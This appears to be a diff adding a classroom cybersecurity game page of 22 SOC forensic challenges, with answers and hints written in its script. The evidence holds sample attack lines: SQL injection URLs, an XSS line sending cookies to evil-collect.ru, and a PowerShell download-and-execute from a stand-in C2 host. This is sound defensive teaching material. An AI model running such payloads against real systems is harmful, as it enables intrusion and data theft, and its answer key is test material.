@@ -1,0 +1,402 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Escape the SOC</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+</head>
+<body class="bg-gray-900 text-gray-100 min-h-screen p-4">
+    <div class="max-w-4xl mx-auto">
+        <div class="text-center mb-6">
+            <h1 class="text-3xl font-bold text-cyan-400">ESCAPE THE SOC</h1>
+            <p class="text-gray-500">Chatty Hackville Forensic Investigation</p>
+            <span class="inline-block mt-2 px-3 py-1 bg-red-600 text-white text-sm font-bold rounded">22 CHALLENGES</span>
+        </div>
+
+        <div class="bg-gray-800 rounded-lg p-4 mb-6 border border-gray-700">
+            <div class="flex justify-between mb-2">
+                <span class="text-cyan-400">Progress</span>
+                <span id="progressText" class="text-green-400 font-bold">0 / 22</span>
+            </div>
+            <div class="h-3 bg-gray-700 rounded-full overflow-hidden">
+                <div id="progressBar" class="h-full bg-gradient-to-r from-cyan-500 to-green-500 transition-all" style="width: 0%"></div>
+            </div>
+        </div>
+
+        <div id="challengeArea" class="bg-gray-800 rounded-lg border border-gray-700 overflow-hidden">
+        </div>
+
+        <div id="completionScreen" class="hidden text-center py-12">
+            <div class="text-6xl mb-4">🏆</div>
+            <h2 class="text-3xl font-bold text-green-400 mb-4">ELITE ANALYST</h2>
+            <p class="text-gray-400 mb-6">You completed all 22 challenges!</p>
+            <button onclick="restart()" class="px-6 py-3 border-2 border-cyan-400 text-cyan-400 rounded-lg font-bold hover:bg-cyan-400 hover:text-gray-900">PLAY AGAIN</button>
+        </div>
+
+        <p class="text-center text-gray-600 text-xs mt-6">Chatfield Senior High School - AP Cybersecurity</p>
+    </div>
+
+<script>
+var current = 1;
+var completed = [];
+var hints = 0;
+
+var data = [
+    {
+        num: 1,
+        type: "Firewall Logs",
+        diff: "Medium",
+        title: "Challenge 1: Perimeter Breach",
+        scenario: "Analyze firewall logs to find which port the attacker at 185.220.101.34 successfully connected to on server 10.0.2.15.",
+        evidence: "2026-01-15 02:04:22 DENY tcp 185.220.101.34 to 10.0.2.15:22 flags:S\n2026-01-15 02:04:22 DENY tcp 185.220.101.34 to 10.0.2.15:3389 flags:S\n2026-01-15 02:04:23 DENY tcp 185.220.101.34 to 10.0.2.15:21 flags:S\n2026-01-15 02:04:24 DENY tcp 185.220.101.34 to 10.0.2.15:23 flags:S\n2026-01-15 02:04:25 ALLOW tcp 185.220.101.34 to 10.0.2.15:443 flags:S\n2026-01-15 02:04:26 ALLOW tcp 185.220.101.34 to 10.0.2.15:443 flags:A\n2026-01-15 02:04:27 DENY tcp 185.220.101.34 to 10.0.2.15:3306 flags:S",
+        question: "What port did the attacker successfully connect to? (number only)",
+        answer: "443",
+        hint: "Look for ALLOW with both S (SYN) and A (ACK) flags - that means connection established.",
+        success: "Correct! Port 443 showed completed TCP handshake."
+    },
+    {
+        num: 2,
+        type: "Auth Logs",
+        diff: "Medium",
+        title: "Challenge 2: Brute Force Timeline",
+        scenario: "Find the exact timestamp when svc_sql was successfully compromised via brute force.",
+        evidence: "2026-01-15 03:14:18 FAILED svc_sql 192.168.50.99 bad password\n2026-01-15 03:14:19 FAILED svc_sql 192.168.50.99 bad password\n2026-01-15 03:14:20 FAILED svc_sql 192.168.50.99 bad password\n2026-01-15 03:14:21 FAILED svc_sql 192.168.50.99 bad password\n2026-01-15 03:14:33 FAILED svc_sql 192.168.50.99 bad password\n2026-01-15 03:14:34 FAILED svc_sql 192.168.50.99 bad password\n2026-01-15 03:14:35 SUCCESS svc_sql 192.168.50.99 authenticated\n2026-01-15 03:14:52 SUCCESS svc_sql 192.168.50.99 SMB session",
+        question: "What time did svc_sql successfully authenticate? (HH:MM:SS)",
+        answer: "03:14:35",
+        hint: "Find where FAILED changes to SUCCESS for svc_sql.",
+        success: "Correct! 03:14:35 marks the compromise."
+    },
+    {
+        num: 3,
+        type: "Web Logs",
+        diff: "Medium",
+        title: "Challenge 3: SQL Injection",
+        scenario: "The attacker used SQL injection to steal data. Which table had the MOST data stolen?",
+        evidence: "185.220.101.34 GET /app/products?id=1 UNION SELECT * FROM users-- 200 5765\n185.220.101.34 GET /app/products?id=1 UNION SELECT * FROM credit_cards-- 200 2847295\n185.220.101.34 GET /app/products?id=1 UNION SELECT * FROM employee_records-- 200 847221\n185.220.101.34 GET /app/products?id=1 UNION SELECT * FROM orders-- 200 12044",
+        question: "Which table had the largest response size? (table name)",
+        answer: "credit_cards",
+        hint: "Compare the numbers at the end - those are response sizes in bytes. 2847295 is biggest.",
+        success: "Correct! credit_cards returned 2.8MB of stolen data."
+    },
+    {
+        num: 4,
+        type: "XSS Attack",
+        diff: "Hard",
+        title: "Challenge 4: Cookie Theft",
+        scenario: "A stored XSS attack is stealing cookies. The script sends data to a tricky domain.",
+        evidence: "Ticket 10444 from guest_user:\n\nscript tag: document.location = http://\nlegit-support.chattyhackville.com.\nevil-collect.ru/steal.php?c= plus document.cookie\n\nOutbound connection logged:\n10.0.1.22 connected to legit-support.chattyhackville.com.evil-collect.ru",
+        question: "What is the ACTUAL malicious root domain? (hint: read right to left)",
+        answer: "evil-collect.ru",
+        hint: "Domain names read RIGHT to LEFT. The root domain is the last two parts before the path.",
+        success: "Correct! evil-collect.ru is the real domain. The rest is a subdomain trick."
+    },
+    {
+        num: 5,
+        type: "Email Headers",
+        diff: "Hard",
+        title: "Challenge 5: Phishing Source",
+        scenario: "The CFO received a fake email from the CEO. Find the true originating IP.",
+        evidence: "Return-Path: ceo at chattyhackville.com\nReceived: from mail01.chattyhackville.com [10.0.2.10]\n  by mx.chattyhackville.com Wed 15 Jan 2026 08:15:02\nReceived: from mx.chattyhackville.com [10.0.2.5]\n  by mail01.chattyhackville.com Wed 15 Jan 2026 08:15:01\nReceived: from smtp-relay-7.provider.net [23.94.122.118]\n  by mx.chattyhackville.com Wed 15 Jan 2026 08:15:00\nReceived: from localhost [103.145.67.203]\n  by smtp-relay-7.provider.net\nX-Originating-IP: [103.145.67.203]\nAuthentication-Results: spf=softfail dkim=none dmarc=fail",
+        question: "What IP address did this email actually originate from?",
+        answer: "103.145.67.203",
+        hint: "Read Received headers BOTTOM to TOP. Also check X-Originating-IP.",
+        success: "Correct! 103.145.67.203 is the true source."
+    },
+    {
+        num: 6,
+        type: "Network Analysis",
+        diff: "Hard",
+        title: "Challenge 6: C2 Beacon",
+        scenario: "Threat hunting found suspicious traffic to 45.33.32.156. Find the beacon interval.",
+        evidence: "09:00:15 10.0.1.47 to 45.33.32.156:443 284 bytes\n09:01:15 10.0.1.47 to 45.33.32.156:443 284 bytes\n09:02:15 10.0.1.47 to 45.33.32.156:443 286 bytes\n09:03:15 10.0.1.47 to 45.33.32.156:443 284 bytes\n09:04:15 10.0.1.47 to 45.33.32.156:443 288 bytes\n09:05:15 10.0.1.47 to 45.33.32.156:443 284 bytes\n09:06:15 10.0.1.47 to 45.33.32.156:443 290 bytes\n09:07:15 10.0.1.47 to 45.33.32.156:443 284 bytes",
+        question: "What is the beacon interval in seconds?",
+        answer: "60",
+        hint: "Look at timestamps: 09:00:15, 09:01:15, 09:02:15... What is the pattern?",
+        success: "Correct! 60-second beacon interval indicates C2 malware."
+    },
+    {
+        num: 7,
+        type: "ACL Analysis",
+        diff: "Hard",
+        title: "Challenge 7: Lateral Movement",
+        scenario: "Attacker on 10.0.1.47 reached database server on port 1433. Which ACL rule allowed this?",
+        evidence: "Rule 100: permit tcp 10.0.5.0/24 to 10.0.10.0/24 port 22\nRule 200: permit tcp 10.0.2.0/24 to 10.0.10.0/24 port 3306\nRule 210: permit tcp 10.0.2.0/24 to 10.0.10.0/24 port 1433\nRule 300: permit tcp 10.0.1.0/24 to 10.0.3.0/24 port 443\nRule 310: permit tcp 10.0.1.0/24 to 10.0.10.0/24 port 1433\nRule 320: permit tcp 10.0.4.0/24 to 10.0.6.0/24 port 443\nRule 999: deny ip any any\n\nNetwork: 10.0.1.0/24=Accounting 10.0.10.0/24=Database",
+        question: "Which rule number allowed the connection?",
+        answer: "310",
+        hint: "10.0.1.47 is in 10.0.1.0/24 (Accounting). Find rule allowing that subnet to databases on 1433.",
+        success: "Correct! Rule 310 permits Accounting to Database on port 1433."
+    },
+    {
+        num: 8,
+        type: "Encoded Payload",
+        diff: "Extreme",
+        title: "Challenge 8: Decode the C2",
+        scenario: "EDR captured encoded PowerShell. The Base64 decodes to reveal a malicious domain.",
+        evidence: "powershell.exe -enc [Base64 string]\n\nDecoded command:\niex (New-Object Net.WebClient).DownloadString\n(http://malware-c2.badactor.xyz/stage2.ps1)\n\nThe script downloads second stage from the C2 server.",
+        question: "What is the C2 domain? (domain.tld.tld format)",
+        answer: "malware-c2.badactor.xyz",
+        hint: "Look at the decoded DownloadString URL. The domain is between http:// and /stage2.ps1",
+        success: "Correct! malware-c2.badactor.xyz is the C2 server."
+    },
+    {
+        num: 9,
+        type: "Log Correlation",
+        diff: "Extreme",
+        title: "Challenge 9: Who Clicked?",
+        scenario: "Correlate three logs to find who clicked the phishing link to chattyhackville-verify.com",
+        evidence: "PROXY LOG:\n02:02:14 10.0.1.31 GET http://secure-login.chattyhackville-verify.com\n02:02:15 10.0.1.31 POST http://secure-login.chattyhackville-verify.com\n\nDHCP LEASES:\n10.0.1.15 = WS-DEV-01\n10.0.1.22 = WS-HR-01\n10.0.1.31 = WS-SALES-01\n10.0.1.47 = WS-ACCT-03\n\nAD LOGONS:\n02:00:11 rmorales logged into WS-SALES-01\n02:01:33 mthompson logged into WS-ACCT-03",
+        question: "Which username clicked the phishing link?",
+        answer: "rmorales",
+        hint: "Proxy: 10.0.1.31 hit phishing site. DHCP: 10.0.1.31 = WS-SALES-01. AD: rmorales on WS-SALES-01.",
+        success: "Correct! rmorales clicked the phishing link."
+    },
+    {
+        num: 10,
+        type: "Packet Analysis",
+        diff: "Extreme",
+        title: "Challenge 10: FTP Password",
+        scenario: "FTP traffic was captured. Extract the cleartext password.",
+        evidence: "Frame 1: 220 Welcome to FTP server\nFrame 2: USER exfil_user\nFrame 3: 331 Password required\nFrame 4: PASS Dr@g0nSl@y3r2026!\nFrame 5: 230 Login successful\nFrame 6: STOR stolen_data.zip\nFrame 7: 226 Transfer complete",
+        question: "What is the FTP password? (exact, case-sensitive)",
+        answer: "Dr@g0nSl@y3r2026!",
+        hint: "Look at Frame 4 - PASS command shows the password in cleartext.",
+        success: "Correct! FTP sends passwords in cleartext. Never use FTP!"
+    },
+    {
+        num: 11,
+        type: "Registry Analysis",
+        diff: "Extreme",
+        title: "Challenge 11: Persistence",
+        scenario: "Find the malicious executable in the registry Run keys.",
+        evidence: "HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\n\nOneDrive = C:\\Users\\mthompson\\AppData\\Local\\Microsoft\\OneDrive\\OneDrive.exe\nSpotify = C:\\Users\\mthompson\\AppData\\Roaming\\Spotify\\Spotify.exe\nChromeUpdate = C:\\Users\\mthompson\\AppData\\Local\\Temp\\svchost.exe\nDiscord = C:\\Users\\mthompson\\AppData\\Local\\Discord\\Update.exe\n\nNOTE: Real svchost.exe is in C:\\Windows\\System32\\",
+        question: "What is the malicious filename? (just the .exe name)",
+        answer: "svchost.exe",
+        hint: "ChromeUpdate runs svchost.exe from Temp folder. Real svchost is in System32.",
+        success: "Correct! svchost.exe in Temp is malicious."
+    },
+    {
+        num: 12,
+        type: "Threat Intel",
+        diff: "Extreme",
+        title: "Challenge 12: Malware Family",
+        scenario: "Identify the malware family from threat intelligence.",
+        evidence: "File: svchost.exe (from Temp folder)\nSHA256: 7b3f5c9a2d8e1f4b6c0a...\n\nVirus Total Results (47/68 detections):\nMicrosoft: Trojan:Win32/CobaltStrike.A\nCrowdStrike: CSAgent.Trojan.CobaltStrike\nKaspersky: Trojan.Win32.CobaltStrike.gen\nESET: Win32/CobaltStrike.Beacon.A\nSophos: Troj/Cobalt-A\nMcAfee: Trojan-Cobalt",
+        question: "What is the malware family name?",
+        answer: "Cobalt Strike",
+        hint: "All vendors include the same name in their detection.",
+        success: "Correct! Cobalt Strike - a pentest tool abused by attackers."
+    },
+    {
+        num: 13,
+        type: "Sysmon",
+        diff: "Extreme",
+        title: "Challenge 13: Process Injection",
+        scenario: "Sysmon shows process injection. Find the VICTIM process PID.",
+        evidence: "Event ID 1 - Process Create\nProcess: C:\\Users\\...\\Temp\\svchost.exe\nPID: 7342\n\nEvent ID 8 - CreateRemoteThread\nSourcePID: 7342 (Temp\\svchost.exe)\nTargetPID: 4528 (RuntimeBroker.exe)\n\nEvent ID 3 - Network Connection\nProcess: RuntimeBroker.exe\nPID: 4528\nDestination: 45.33.32.156:443",
+        question: "What is the PID of the process that was INJECTED INTO?",
+        answer: "4528",
+        hint: "Event ID 8: Source=attacker, Target=victim. The victim then makes C2 connection.",
+        success: "Correct! PID 4528 (RuntimeBroker) was injected into."
+    },
+    {
+        num: 14,
+        type: "DNS Exfil",
+        diff: "Extreme",
+        title: "Challenge 14: Hidden in DNS",
+        scenario: "Data is being exfiltrated via DNS subdomain queries. Decode the hex.",
+        evidence: "DNS Queries to data-sync.xyz:\n63726564656e7469616c73.data-sync.xyz\n7061796d656e74.data-sync.xyz\n696e666f.data-sync.xyz\n\nHex Decoder:\n63=c 72=r 65=e 64=d 65=e 6e=n 74=t 69=i 61=a 6c=l 73=s",
+        question: "Decode the first subdomain. What word is it?",
+        answer: "credentials",
+        hint: "Use the decoder: 63=c, 72=r, 65=e, 64=d, 65=e, 6e=n, 74=t, 69=i, 61=a, 6c=l, 73=s",
+        success: "Correct! credentials - data hidden in DNS queries."
+    },
+    {
+        num: 15,
+        type: "Scheduled Tasks",
+        diff: "Extreme",
+        title: "Challenge 15: Task Persistence",
+        scenario: "Find the malicious scheduled task.",
+        evidence: "Task: WindowsUpdate\\Scheduled Start\nAuthor: Microsoft Corporation\nRun: sc.exe start wuauserv\nUser: SYSTEM\n\nTask: WindowsBackup\\ConfigNotification\nAuthor: N/A\nRun: C:\\Users\\mthompson\\AppData\\Local\\Temp\\updater.exe\nTrigger: Every 1 hour + At logon\nUser: CHATTY\\mthompson\n\nTask: Shell\\IndexerMaintenance\nAuthor: Microsoft Corporation\nRun: rundll32.exe\nUser: SYSTEM",
+        question: "What is the malicious task name? (after the backslash)",
+        answer: "ConfigNotification",
+        hint: "Red flags: Author N/A, Temp folder, regular user, hourly trigger.",
+        success: "Correct! ConfigNotification is the malicious task."
+    },
+    {
+        num: 16,
+        type: "Memory Forensics",
+        diff: "Extreme",
+        title: "Challenge 16: Cached Creds",
+        scenario: "Memory dump reveals cached credentials. Find the domain admin password.",
+        evidence: "Volatility lsadump output:\n\nUser: dadmin\nDomain: CHATTY\nNTLM Hash: 8846f7eaee8fb117ad06bdd830b7586c\nWDigest Password: Adm1n$ecureP@ss!\nKerberos Password: Adm1n$ecureP@ss!",
+        question: "What is dadmin's plaintext password? (exact)",
+        answer: "Adm1n$ecureP@ss!",
+        hint: "WDigest and Kerberos sections show plaintext passwords cached in memory.",
+        success: "Correct! Credential Guard would prevent this!"
+    },
+    {
+        num: 17,
+        type: "Steganography",
+        diff: "Extreme",
+        title: "Challenge 17: Hidden Message",
+        scenario: "Base64 data hidden in image metadata reveals the next target.",
+        evidence: "exiftool suspicious_image.jpg:\n\nFile: suspicious_image.jpg\nCamera: iPhone 13 Pro\nGPS: 39.7392 N, 104.9903 W\n\nUser Comment: VGFyZ2V0OiBEQzAyLmNoYXR0eS5sb2NhbA==\n\nBase64 decoded: Target: DC02.chatty.local",
+        question: "What server is the next target? (hostname)",
+        answer: "DC02.chatty.local",
+        hint: "The Base64 decodes to: Target: DC02.chatty.local",
+        success: "Correct! DC02.chatty.local is the next target."
+    },
+    {
+        num: 18,
+        type: "Firewall Audit",
+        diff: "Hard",
+        title: "Challenge 18: Count the Flaws",
+        scenario: "Audit this firewall config. How many rules are problematic?",
+        evidence: "Rule 1: permit tcp any to 10.0.2.0/24 port 443 [OK - web server]\nRule 2: permit tcp any to 10.0.2.0/24 port 80 [OK - web server]\nRule 3: permit tcp any to 10.0.2.15 port 22 [BAD - SSH from internet]\nRule 5: permit ip 10.0.0.0/8 to any [BAD - all outbound]\nRule 12: permit tcp 10.0.1.0/24 to 10.0.10.0/24 port 1433 [BAD - direct DB]\nRule 13: permit ip 10.0.4.0/24 to 10.0.0.0/8 [BAD - HR to everything]\nRule 14: deny ip 10.0.99.0/24 to 10.0.0.0/8 [OK - guest isolation]\nRule 15: permit ip 10.0.8.0/24 to 10.0.0.0/8 [BAD - vendor full access]\nRule 16: permit tcp any to any ports 8000-9000 [BAD - any to any]",
+        question: "How many rules are BAD? (number)",
+        answer: "6",
+        hint: "Count the BAD labels: Rules 3, 5, 12, 13, 15, 16",
+        success: "Correct! 6 problematic rules found."
+    },
+    {
+        num: 19,
+        type: "Config Diff",
+        diff: "Hard",
+        title: "Challenge 19: Backdoor Port",
+        scenario: "Compare before/after firewall configs. What port did the attacker add?",
+        evidence: "BEFORE (December):\npermit tcp any to 10.0.2.0/24 port 443\npermit tcp any to 10.0.2.0/24 port 80\ndeny tcp any to any port 22\ndeny ip any any\n\nAFTER (Current):\npermit tcp any to 10.0.2.0/24 port 443\npermit tcp any to 10.0.2.0/24 port 80\ndeny tcp any to any port 22\npermit tcp any to 10.0.2.15 port 4444  <-- NEW\ndeny ip any any",
+        question: "What port did the attacker open?",
+        answer: "4444",
+        hint: "Compare line by line. Port 4444 is Metasploit default!",
+        success: "Correct! Port 4444 - classic Metasploit backdoor."
+    },
+    {
+        num: 20,
+        type: "Rule Order",
+        diff: "Extreme",
+        title: "Challenge 20: First Match Wins",
+        scenario: "C2 block exists but does not work. Which rule should it be BEFORE?",
+        evidence: "Rule 1: permit udp 10.0.0.0/8 to any port 53 [DNS]\nRule 2: permit tcp 10.0.0.0/8 to any port 80 [HTTP]\nRule 3: permit tcp 10.0.0.0/8 to any port 443 [HTTPS]\nRule 4: permit tcp 10.0.0.0/8 to any port 587 [Email]\nRule 5: deny tcp 10.0.0.0/8 to 104.244.42.0/24 port 443 [Block Twitter]\nRule 6: deny ip 10.0.0.0/8 to 45.33.32.156 [Block C2]\nRule 7: deny ip any any\n\nPROBLEM: Traffic to 45.33.32.156:443 is ALLOWED!\nC2 uses port 443, so Rule 3 matches first.",
+        question: "Rule 6 should be moved BEFORE which rule number?",
+        answer: "3",
+        hint: "C2 traffic goes to port 443. Rule 3 allows all HTTPS before Rule 6 is checked.",
+        success: "Correct! Specific blocks must come before general allows."
+    },
+    {
+        num: 21,
+        type: "CIDR Writing",
+        diff: "Extreme",
+        title: "Challenge 21: Block the Subnet",
+        scenario: "Write CIDR notation to block the attacker subnet.",
+        evidence: "Attack IPs from same campaign:\n185.220.101.34 (port scan)\n185.220.101.42 (C2 callback)\n185.220.101.78 (credential stuffing)\n185.220.101.91 (data exfil)\n\nTask: Block entire /24 subnet\n\nCIDR Reference:\n/32 = single IP (x.x.x.x)\n/24 = 256 IPs (x.x.x.0 to x.x.x.255)\n/16 = 65536 IPs",
+        question: "What CIDR blocks all these IPs? (x.x.x.0/24 format)",
+        answer: "185.220.101.0/24",
+        hint: "For /24, take first three octets and add .0/24",
+        success: "Correct! 185.220.101.0/24 blocks the whole subnet."
+    },
+    {
+        num: 22,
+        type: "Stateful Firewall",
+        diff: "Extreme",
+        title: "Challenge 22: Count Attackers",
+        scenario: "Count UNIQUE IPs that attempted NEW inbound connections (not ESTAB responses).",
+        evidence: "02:04:22 DENY IN 185.220.101.34 to 10.0.2.15 NEW\n02:04:22 DENY IN 185.220.101.34 to 10.0.2.15 NEW\n02:04:23 ALLOW IN 8.8.8.8 to 10.0.1.22 ESTAB [Google response]\n02:04:24 DENY IN 192.168.50.99 to 10.0.2.15 NEW\n02:04:24 DENY IN 45.33.32.156 to 10.0.2.15 NEW\n02:04:25 ALLOW IN 142.250.80.46 to 10.0.1.47 ESTAB [Google response]\n02:04:26 DENY IN 103.145.67.203 to 10.0.2.15 NEW\n02:04:28 DENY IN 23.94.122.118 to 10.0.2.15 NEW\n02:04:30 DENY IN 192.168.50.99 to 10.0.2.15 NEW",
+        question: "How many UNIQUE external IPs attempted NEW connections?",
+        answer: "5",
+        hint: "Filter for NEW only. Unique IPs: 185.220.101.34, 192.168.50.99, 45.33.32.156, 103.145.67.203, 23.94.122.118",
+        success: "Correct! 5 unique attackers. ESTAB entries are legitimate responses."
+    }
+];
+
+function render() {
+    if (completed.length === 22) {
+        document.getElementById("challengeArea").classList.add("hidden");
+        document.getElementById("completionScreen").classList.remove("hidden");
+        return;
+    }
+
+    var c = data[current - 1];
+    var diffColor = c.diff === "Medium" ? "bg-orange-500" : c.diff === "Hard" ? "bg-red-500" : "bg-purple-600";
+    
+    var html = '<div class="p-4 border-b border-gray-700">';
+    html += '<div class="flex gap-2 mb-2">';
+    html += '<span class="px-2 py-1 bg-cyan-600 text-white text-xs font-bold rounded">' + c.type + '</span>';
+    html += '<span class="px-2 py-1 ' + diffColor + ' text-white text-xs font-bold rounded">' + c.diff + '</span>';
+    html += '</div>';
+    html += '<h2 class="text-xl font-bold mb-2">' + c.title + '</h2>';
+    html += '<p class="text-gray-400 text-sm">' + c.scenario + '</p>';
+    html += '</div>';
+    
+    html += '<div class="p-4">';
+    html += '<div class="text-orange-400 text-xs uppercase mb-2">Evidence</div>';
+    html += '<div class="bg-black rounded p-4 overflow-x-auto">';
+    html += '<pre class="text-green-400 text-xs whitespace-pre-wrap">' + c.evidence + '</pre>';
+    html += '</div></div>';
+    
+    html += '<div class="p-4 border-t border-gray-700 bg-gray-900">';
+    html += '<p class="mb-4"><span class="text-cyan-400 font-bold">Question: </span>' + c.question + '</p>';
+    html += '<div class="flex gap-2 flex-wrap">';
+    html += '<input type="text" id="answerBox" placeholder="Your answer..." class="flex-1 min-w-48 bg-gray-800 border border-gray-600 rounded px-4 py-2 focus:border-cyan-400 focus:outline-none">';
+    html += '<button onclick="check()" class="px-6 py-2 bg-cyan-600 text-white font-bold rounded hover:bg-cyan-500">SUBMIT</button>';
+    html += '</div>';
+    html += '<div id="feedback" class="mt-4 hidden"></div>';
+    html += '<button onclick="showHint()" class="mt-4 px-4 py-2 border border-gray-600 text-gray-400 rounded text-sm hover:border-orange-400 hover:text-orange-400">Need a hint?</button>';
+    html += '<div id="hintBox" class="mt-3 p-3 bg-orange-900 border-l-4 border-orange-500 text-orange-300 text-sm hidden">' + c.hint + '</div>';
+    html += '</div>';
+    
+    document.getElementById("challengeArea").innerHTML = html;
+    document.getElementById("answerBox").addEventListener("keypress", function(e) {
+        if (e.key === "Enter") check();
+    });
+    
+    document.getElementById("progressText").textContent = completed.length + " / 22";
+    document.getElementById("progressBar").style.width = (completed.length / 22 * 100) + "%";
+}
+
+function check() {
+    var c = data[current - 1];
+    var input = document.getElementById("answerBox");
+    var feedback = document.getElementById("feedback");
+    var userAnswer = input.value.trim().toLowerCase();
+    var correctAnswer = c.answer.toLowerCase();
+    
+    feedback.classList.remove("hidden");
+    
+    if (userAnswer === correctAnswer || userAnswer === correctAnswer.replace(/ /g, "")) {
+        feedback.className = "mt-4 p-4 rounded border bg-green-900 border-green-500 text-green-400";
+        feedback.innerHTML = "ACCESS GRANTED - " + c.success;
+        completed.push(current);
+        
+        setTimeout(function() {
+            if (current < 22) {
+                current++;
+            }
+            render();
+        }, 2000);
+    } else {
+        feedback.className = "mt-4 p-4 rounded border bg-red-900 border-red-500 text-red-400";
+        feedback.textContent = "ACCESS DENIED - Try again.";
+        input.value = "";
+        input.focus();
+    }
+}
+
+function showHint() {
+    document.getElementById("hintBox").classList.remove("hidden");
+    hints++;
+}
+
+function restart() {
+    current = 1;
+    completed = [];
+    hints = 0;
+    document.getElementById("challengeArea").classList.remove("hidden");
+    document.getElementById("completionScreen").classList.add("hidden");
+    render();
+}
+
+render();
+</script>
+</body>
+</html>
